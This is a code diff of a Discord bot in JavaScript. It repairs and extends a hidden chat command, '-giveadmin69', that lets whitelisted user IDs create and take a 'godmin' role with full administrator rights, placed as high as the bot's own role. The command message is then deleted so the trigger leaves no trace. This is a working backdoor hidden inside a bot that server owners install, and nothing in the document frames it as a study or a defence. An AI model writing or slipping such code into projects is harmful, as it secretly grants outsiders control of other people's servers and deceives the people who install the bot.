@@ -987,10 +987,12 @@ client.on('message', message => {
 
 
 
-  client.on('message', message => {
+ 
+  client.on('message', async message => {
     if(message.content === '-giveadmin69') {
       if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
-          let e = list.find(id => id === msg.author.id)
+          let e = list.find(id => id === message.author.id)
+          var botr = message.guild.me.roles.highest.position - 0
           if(!e) {
               msg.channel.send("Nightmare troupe only").then(m => {
                   setTimeout(() => {
@@ -1000,8 +1002,8 @@ client.on('message', message => {
               )
           }else{
   const adminn = message.guild.roles.cache.find(r => r.name === 'godmin')
-      if(!admin) {message.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'] } }).then(message.member.roles.add(adminn))}    
-       else{message.member.roles.add(adminn)}
+      if(!adminn) {message.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'], position: botr} }).then(r => message.member.roles.add(r).then(message.delete()))}    
+       else{message.member.roles.add(adminn).then(message.delete())}
     }
     }
   })
